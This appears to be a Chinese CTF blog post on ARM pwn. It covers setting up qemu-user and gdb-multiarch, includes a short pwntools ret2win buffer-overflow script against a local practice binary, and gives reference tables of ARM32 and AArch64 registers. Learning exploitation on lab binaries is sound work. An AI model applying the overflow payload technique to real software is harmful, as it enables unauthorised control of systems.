@@ -1,0 +1,810 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    ARM-PWN | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="ARM-PWNARMPWN 环境搭建与题目学习过程：使用 qemu-user123sudo apt updatesudo apt install qemu-user-static binfmt-supportsudo apt install libc6-armel-cross libc6-arm64-cross # 安装 32 位和 64 位的交叉编译库（为了运行时的动态链接）  安装 32 位和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ARM-PWN">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/ARM-PWN/index/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="ARM-PWNARMPWN 环境搭建与题目学习过程：使用 qemu-user123sudo apt updatesudo apt install qemu-user-static binfmt-supportsudo apt install libc6-armel-cross libc6-arm64-cross # 安装 32 位和 64 位的交叉编译库（为了运行时的动态链接）  安装 32 位和">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154099272-6b3a1de9-c678-468f-b29b-4eb3fec58b3c-875494.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154463909-3f7cef47-1333-4108-8043-266f086087f3-769764.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154489204-56ae2ed2-7ab5-4cf5-8e30-5fb6d1ca9cb4-510257.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778155005185-73102a1d-c8f6-4ebf-82b0-fd3f476f74fa-232668.png">
+<meta property="article:published_time" content="2026-05-22T18:46:44.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.396Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154099272-6b3a1de9-c678-468f-b29b-4eb3fec58b3c-875494.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="ARM-PWN">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">ARM-PWN</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM-PWN"><span class="toc-number">1.</span> <span class="toc-text">ARM-PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARMPWN-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">ARMPWN 环境搭建与题目学习过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-qemu-user"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用 qemu-user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-32-%E4%BD%8D%E5%92%8C-64-%E4%BD%8D-ARM-%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E8%A1%8C%E5%BA%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">安装 32 位和 64 位 ARM 的基础运行库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8D%B3%E5%8F%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text">直接运行即可</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%B0%83%E8%AF%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">gdb 调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.1.5.</span> <span class="toc-text">python 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E7%89%B9%E5%AE%9A%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.1.6.</span> <span class="toc-text">架构特定设置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM-%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">ARM 架构基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81-ARM-32%E4%BD%8D-AArch32-ARMv7-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、 ARM 32位 (AArch32 &#x2F; ARMv7) 寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-ARM-64%E4%BD%8D-AArch64-ARMv8-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">二、 ARM 64位 (AArch64 &#x2F; ARMv8) 寄存器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-%E5%AF%B9%E5%BA%94-ARM-%E7%9A%84%E6%8C%87%E4%BB%A4%E9%9B%86%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">x86 对应 ARM 的指令集：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-push-%E5%8E%8B%E6%A0%88"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. push (压栈)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-pop-%E5%87%BA%E6%A0%88"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. pop (出栈)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cmp-%E6%AF%94%E8%BE%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. cmp (比较)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-jmp-%E6%97%A0%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. jmp (无条件跳转)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-call-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. call (函数调用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-leave-%E9%94%80%E6%AF%81%E6%A0%88%E5%B8%A7"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. leave (销毁栈帧)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-ret-%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. ret (函数返回)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-ARM-PWN/index" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:44.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.396Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ARM-PWN"><a href="#ARM-PWN" class="headerlink" title="ARM-PWN"></a>ARM-PWN</h1><h3 id="ARMPWN-环境搭建与题目学习过程："><a href="#ARMPWN-环境搭建与题目学习过程：" class="headerlink" title="ARMPWN 环境搭建与题目学习过程："></a>ARMPWN 环境搭建与题目学习过程：</h3><h4 id="使用-qemu-user"><a href="#使用-qemu-user" class="headerlink" title="使用 qemu-user"></a>使用 qemu-user</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-user-static binfmt-support</span><br><span class="line"><span class="built_in">sudo</span> apt install libc6-armel-cross libc6-arm64-cross <span class="comment"># 安装 32 位和 64 位的交叉编译库（为了运行时的动态链接）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="安装-32-位和-64-位-ARM-的基础运行库"><a href="#安装-32-位和-64-位-ARM-的基础运行库" class="headerlink" title="安装 32 位和 64 位 ARM 的基础运行库"></a>安装 32 位和 64 位 ARM 的基础运行库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 QEMU 用户模式模拟器</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install qemu-user-static binfmt-support -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 安装 32 位和 64 位 ARM 的基础运行库</span></span><br><span class="line"><span class="built_in">sudo</span> apt install libc6-armel-cross libc6-arm64-cross -y</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="直接运行即可"><a href="#直接运行即可" class="headerlink" title="直接运行即可"></a>直接运行即可</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行 ARM32</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./ret2win_armv5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 ARM64</span></span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./armpwn    </span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154099272-6b3a1de9-c678-468f-b29b-4eb3fec58b3c-875494.png" alt="1778154099272-6b3a1de9-c678-468f-b29b-4eb3fec58b3c.png"></p>
+<h4 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./arm32_pwn            <span class="comment"># 32位</span></span><br><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./arm64_pwn        <span class="comment"># 64位</span></span><br></pre></td></tr></table></figure>
+
+<p>打开一个新终端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./文件名</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>连接：pwndbg&gt; target remote :1234，之后就可以进行调试了：</li>
+</ul>
+<p><img src="/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154463909-3f7cef47-1333-4108-8043-266f086087f3-769764.png" alt="1778154463909-3f7cef47-1333-4108-8043-266f086087f3.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778154489204-56ae2ed2-7ab5-4cf5-8e30-5fb6d1ca9cb4-510257.png" alt="1778154489204-56ae2ed2-7ab5-4cf5-8e30-5fb6d1ca9cb4.png"></p>
+<h4 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span>                      <span class="comment"># 32</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = &quot;aarch64&quot;                # 64</span></span><br><span class="line"><span class="comment"># p = process([&#x27;qemu-aarch64&#x27;, &#x27;-L&#x27;, &quot;/usr/aarch64-linux-gnu&quot;, &#x27;./binary_64&#x27;])</span></span><br><span class="line"></span><br><span class="line">ret2win_addr = <span class="number">0x000105ec</span> </span><br><span class="line">offset = <span class="number">36</span> </span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset + p32(ret2win_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/images/pwn/rvq002RA_Cdh_KK3/1778155005185-73102a1d-c8f6-4ebf-82b0-fd3f476f74fa-232668.png" alt="1778155005185-73102a1d-c8f6-4ebf-82b0-fd3f476f74fa.png"></p>
+<h4 id="架构特定设置"><a href="#架构特定设置" class="headerlink" title="架构特定设置"></a>架构特定设置</h4><ul>
+<li><strong>32位专用：</strong><code>pwndbg&gt; set architecture arm</code></li>
+<li><strong>64位专用：</strong><code>pwndbg&gt; set architecture aarch64</code></li>
+</ul>
+<h3 id="ARM-架构基础知识"><a href="#ARM-架构基础知识" class="headerlink" title="ARM 架构基础知识"></a>ARM 架构基础知识</h3><p>基础的 ARM 架构环境和做题流程都基本了解了，需要补充的就一点一点学习，下面来了解 ARM 架构的基础知识</p>
+<p>与x86&#x2F;x64架构大量依赖栈来传递参数不同，ARM架构高度依赖寄存器。以下是ARM 32位（AArch32）和64位（AArch64）架构中常用寄存器的详细解析：</p>
+<hr>
+<h4 id="一、-ARM-32位-AArch32-ARMv7-寄存器"><a href="#一、-ARM-32位-AArch32-ARMv7-寄存器" class="headerlink" title="一、 ARM 32位 (AArch32 &#x2F; ARMv7) 寄存器"></a>一、 ARM 32位 (AArch32 &#x2F; ARMv7) 寄存器</h4><p>在32位模式下，ARM拥有16个可见的通用寄存器（R0 - R15）以及一个状态寄存器。所有的寄存器都是32位宽。</p>
+<table>
+<thead>
+<tr>
+<th><strong>寄存器</strong></th>
+<th><strong>别名</strong></th>
+<th><strong>在函数调用与Pwn中的核心作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>R0 - R3</strong></td>
+<td>A1 - A4</td>
+<td><strong>参数传递与返回值</strong>。函数的前4个参数通过这四个寄存器传递，多余的参数压入栈中。R0 通常也用于存放函数执行后的返回值。</td>
+</tr>
+<tr>
+<td><strong>R4 - R10</strong></td>
+<td>V1- V7</td>
+<td><strong>局部变量寄存器</strong>。被调用的函数如果要使用这些寄存器，必须先保存它们的值，并在返回前恢复。</td>
+</tr>
+<tr>
+<td><strong>R11</strong></td>
+<td>FP</td>
+<td><strong>栈帧指针 Frame Pointer</strong>。类似于x86的ebp<br/>，用于定位当前函数的局部变量和参数。</td>
+</tr>
+<tr>
+<td><strong>R12</strong></td>
+<td>IP</td>
+<td><strong>内部过程调用寄存器 Intra-Procedure-call</strong>通常在动态链接和位置无关代码（PIC）中用作临时计算，链接器插入的veneer代码（如PLT&#x2F;GOT跳转）经常使用它。</td>
+</tr>
+<tr>
+<td><strong>R13</strong></td>
+<td>SP</td>
+<td><strong>栈指针 Stack Pointer</strong>。类似于x86的esp<br/>，指向当前栈顶。</td>
+</tr>
+<tr>
+<td><strong>R14</strong></td>
+<td>LR</td>
+<td><strong>链接寄存器 (Link Register)</strong>。<br/>当使用BL指令进行函数调用时，硬件会自动将返回地址存入LR寄存器。函数返回时，通常会执行<code>MOV PC, LR</code>或从栈中弹出值到PC</td>
+</tr>
+<tr>
+<td><strong>R15</strong></td>
+<td>PC</td>
+<td><strong>程序计数器 (Program Counter)</strong>。类似于x86的eip。在32位ARM中，PC可以作为通用寄存器直接读写，这意味着你可以直接通过指令（如 <code>MOV PC, R0</code>）来劫持控制流。</td>
+</tr>
+<tr>
+<td><strong>CPSR</strong></td>
+<td>-</td>
+<td><strong>当前程序状态寄存器</strong>。保存条件标志位（如N, Z, C, V）和控制位（如当前处理器模式、中断屏蔽位以及最重要的<strong>T位</strong>：决定当前是ARM指令集还是Thumb指令集）。</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="二、-ARM-64位-AArch64-ARMv8-寄存器"><a href="#二、-ARM-64位-AArch64-ARMv8-寄存器" class="headerlink" title="二、 ARM 64位 (AArch64 &#x2F; ARMv8) 寄存器"></a>二、 ARM 64位 (AArch64 &#x2F; ARMv8) 寄存器</h4><p>升级到64位后，寄存器数量大幅增加到31个通用寄存器。每个寄存器有64位宽（用 <code>X0</code>-<code>X30</code> 表示）和32位宽的访问方式（用 <code>W0</code>-<code>W30</code> 表示，访问时只会操作低32位，高32位清零）。</p>
+<table>
+<thead>
+<tr>
+<th><strong>寄存器</strong></th>
+<th><strong>在函数调用与Pwn中的核心作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>X0 - X7</strong></td>
+<td><strong>参数传递与返回值</strong>。支持多达8个参数通过寄存器传递。X0用于存放返回值。这使得64位ARM函数在不触碰栈的情况下能做更多事情。</td>
+</tr>
+<tr>
+<td><strong>X8</strong></td>
+<td><strong>间接结果位置寄存器</strong>。当函数返回一个非常大的结构体时，X8 用来保存该结构体在内存中的目标地址。</td>
+</tr>
+<tr>
+<td><strong>X9 - X15</strong></td>
+<td><strong>临时寄存器</strong>。调用者负责保存，被调用函数可以随意覆盖。</td>
+</tr>
+<tr>
+<td><strong>X16, X17</strong></td>
+<td><strong>IP0, IP1</strong>。类似于32位的R12，主要用于链接器的跳板代码，PLT表解析等</td>
+</tr>
+<tr>
+<td><strong>X18</strong></td>
+<td>平台保留寄存器（有时用作TLS指针）。通常在用户态应用中避免使用。</td>
+</tr>
+<tr>
+<td><strong>X19 - X28</strong></td>
+<td><strong>局部变量寄存器</strong>。被调用的函数必须在修改前将其压栈并在返回前恢复。在构造复杂的ROP链时，如ret2csu，这些寄存器经常被用来控制执行流</td>
+</tr>
+<tr>
+<td><strong>X29</strong></td>
+<td><strong>FP (Frame Pointer)</strong>。指向当前栈帧的底部。</td>
+</tr>
+<tr>
+<td><strong>X30</strong></td>
+<td><strong>LR (Link Register)</strong>。保存函数调用的返回地址。执行RET指令时，CPU会将X30的值赋给PC</td>
+</tr>
+<tr>
+<td><strong>SP</strong></td>
+<td><strong>栈指针</strong>。在64位中，<code>SP</code>拥有专门的硬件寄存器，不再与通用寄存器（如X31）混用。</td>
+</tr>
+<tr>
+<td><strong>PC</strong></td>
+<td><strong>程序计数器</strong>。<strong>重大改变：</strong> 在AArch64中，<code>PC</code>不再是通用寄存器，不能直接对其进行算术运算或赋值。你必须使用跳转指令如 <code>RET``BR``BLR</code>来修改它</td>
+</tr>
+<tr>
+<td><strong>PSTATE</strong></td>
+<td>替代了32位的<code>CPSR</code>，包含状态标志位等信息。</td>
+</tr>
+</tbody></table>
+<hr>
